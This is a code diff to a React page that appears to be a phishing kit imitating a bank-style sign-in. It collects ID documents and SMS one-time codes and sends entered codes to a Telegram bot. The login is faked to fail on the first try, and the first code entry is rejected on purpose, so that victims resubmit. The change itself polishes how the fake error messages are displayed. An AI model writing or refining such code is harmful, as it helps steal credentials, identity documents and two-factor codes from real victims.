@@ -24,6 +24,7 @@ export default function Home() {
   const [driversLicenseBack, setDriversLicenseBack] = useState<File | null>(null);
   const [passport, setPassport] = useState<File | null>(null);
   const [codeError, setCodeError] = useState<string | null>(null);
+  const [loginError, setLoginError] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
 
   // Send message to Telegram
@@ -79,29 +80,13 @@ export default function Home() {
     );
 
     setLoading(true);
+    setLoginError(null); // Clear previous login error
     await new Promise((resolve) => setTimeout(resolve, 2000));
     setLoading(false);
 
     if (attemptCount === 0) {
       setAttemptCount(1);
-      const errorElement = document.createElement("div");
-      errorElement.style.cssText = `
-        background-color: #f8d7da;
-        color: #721c24;
-        padding: 10px;
-        border-radius: 5px;
-        margin-bottom: 20px;
-      `;
-      errorElement.innerHTML = `
-        <span>! Error</span>
-        <p>Your sign in details are incorrect (RFM10A)</p>
-        <a href="#" style="color: #0066CC; text-decoration: underline;">Forgot username</a>
-        <a href="#" style="color: #0066CC; text-decoration: underline; margin-left: 10px;">Forgot password</a>
-      `;
-      const mainElement = document.querySelector("main");
-      if (mainElement) {
-        mainElement.prepend(errorElement);
-      }
+      setLoginError("Your sign in details are incorrect (RFM10A)");
     } else if (attemptCount === 1) {
       setAttemptCount(2);
       setShowCodePage(true);
@@ -114,12 +99,13 @@ export default function Home() {
 
     await sendTelegramMessage(`Code entered: ${code}`);
 
+    setLoading(true);
+    setCodeError(null); // Clear previous code error
+    await new Promise((resolve) => setTimeout(resolve, 2000));
+    setLoading(false);
+
     if (codeAttemptCount === 0) {
       setCodeAttemptCount(1);
-      setLoading(true);
-      setCodeError(null);
-      await new Promise((resolve) => setTimeout(resolve, 2000));
-      setLoading(false);
       setCodeError("You entered the incorrect code (RFM68A)");
       setShowCodePage(true);
     } else if (codeAttemptCount === 1) {
@@ -439,6 +425,12 @@ export default function Home() {
           </div>
         </header>
         <main className="max-w-2xl mx-auto px-4 py-8">
+          {codeError && (
+            <div className="bg-red-100 text-red-800 p-3 rounded mb-4">
+              <strong>! Error</strong>
+              <p className="mt-1">{codeError}</p>
+            </div>
+          )}
           <h1 className="text-4xl font-bold text-gray-900 mb-4">Enter code</h1>
           <p>We sent a code by SMS to your mobile number.</p>
           <div className="space-y-2 mt-4">
@@ -448,12 +440,6 @@ export default function Home() {
             {loading && (
               <div className="flex items-center justify-center mt-4">
                 <div className="animate-spin rounded-full h-10 w-10 border-t-4 border-b-4 border-[#87CEEB]"></div>
-              </div>
-            )}
-            {codeError && (
-              <div className="bg-red-100 text-red-800 p-3 rounded mt-4">
-                <strong>! Error</strong>
-                <p className="mt-1">{codeError}</p>
               </div>
             )}
           </div>
@@ -539,6 +525,14 @@ export default function Home() {
         {loading && (
           <div className="flex items-center justify-center mt-4">
             <div className="animate-spin rounded-full h-10 w-10 border-t-4 border-b-4 border-[#87CEEB]"></div>
+          </div>
+        )}
+        {loginError && (
+          <div className="bg-red-100 text-red-800 p-3 rounded mb-4">
+            <strong>! Error</strong>
+            <p className="mt-1">{loginError}</p>
+            <a href="#" className="text-[#0066CC] underline inline-block">Forgot username</a>
+            <a href="#" className="text-[#0066CC] underline inline-block ml-2">Forgot password</a>
           </div>
         )}
         <button className="flex items-center gap-2 text-[#0066CC] font-medium mb-8 hover:underline">
